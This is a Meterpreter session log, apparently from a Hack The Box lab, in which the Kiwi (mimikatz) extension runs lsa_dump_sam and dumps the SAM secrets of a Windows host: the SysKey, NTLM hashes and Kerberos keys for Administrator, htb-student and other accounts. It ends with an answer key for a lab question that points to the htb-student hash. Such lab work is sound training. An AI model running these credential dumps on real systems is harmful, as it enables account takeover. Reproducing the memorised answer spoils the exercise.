+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+[!] Loaded x86 Kiwi on an x64 architecture.
+
+Success.
+meterpreter > lsa_dump_sam   
+[+] Running as SYSTEM
+[*] Dumping SAM
+Domain : WIN-51BJ97BCIPV
+SysKey : c897d22c1c56490b453e326f86b2eef8
+Local SID : S-1-5-21-2348711446-3829538955-3974936019
+
+SAMKey : e52d743c76043bf814df6e48f1efcb23
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: bdaffbfe64f1fc646a3353be1c2c3c99
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : d0e507b237b40a3a1f62ba1935465406
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WIN-51BJ97BCIPVAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 545c81812fc803221b22e47ab8789c104f38b151c677fbc4006894db6d174f1b
+      aes128_hmac       (4096) : 5d59bcd0e74c5ed8951b9f2b658eef43
+      des_cbc_md5       (4096) : 76436b1c190d892a
+    OldCredentials
+      aes256_hmac       (4096) : a394ab9b7c712a9e0f3edb58404f9cf086132d29ab5b796d937b197862331b07
+      aes128_hmac       (4096) : 7630dab9bdaeebf9b4aa6c595347a0cc
+      des_cbc_md5       (4096) : 9876615285c2766e
+    OlderCredentials
+      aes256_hmac       (4096) : 09c55a10e6b955caac4abbf7ff37b81488a2ede67a150c00c775fa00d94768ab
+      aes128_hmac       (4096) : b49643128581ac08a1fae957f7787f72
+      des_cbc_md5       (4096) : d32592d63b75ec1f
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : WIN-51BJ97BCIPVAdministrator
+    Credentials
+      des_cbc_md5       : 76436b1c190d892a
+    OldCredentials
+      des_cbc_md5       : 9876615285c2766e
+
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+  Hash NTLM: 4b4ba140ac0767077aee1958e7f78070
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 92793b2cbb0532b4fbea6c62ee1c72c8
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WDAGUtilityAccount
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : c34300ce936f766e6b0aca4191b93dfb576bbe9efa2d2888b3f275c74d7d9c55
+      aes128_hmac       (4096) : 6b6a769c33971f0da23314d5cef8413e
+      des_cbc_md5       (4096) : 61299e7a768fa2d5
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : WDAGUtilityAccount
+    Credentials
+      des_cbc_md5       : 61299e7a768fa2d5
+
+
+RID  : 000003ea (1002)
+User : htb-student
+  Hash NTLM: cf3a5525ee9414229e66279623ed5c58
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : f88979e2a6999b5cbc7a9308e7b4cd82
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WIN-51BJ97BCIPVhtb-student
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 1ed226feb91bfd21489a12a58c6cb38b99ab70feb30d971c8987fb44bcb15213
+      aes128_hmac       (4096) : 629343148027bcf0d48cf49b066a9960
+      des_cbc_md5       (4096) : 379791d616ef6d0e
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : WIN-51BJ97BCIPVhtb-student
+    Credentials
+      des_cbc_md5       : 379791d616ef6d0e
+
+
+Answer for Question 2: cf3a5525ee9414229e66279623ed5c58
+
+Explanation: In the lsa_dump_sam output, locate the section for User : htb-student (RID 1002). The NTLM Hash is listed immediately after Hash NTLM:.
+
+User: htb-student
+NTLM Hash: cf3a5525ee9414229e66279623ed5c58
+Submit this exact string as the answer.
+meterpreter > 
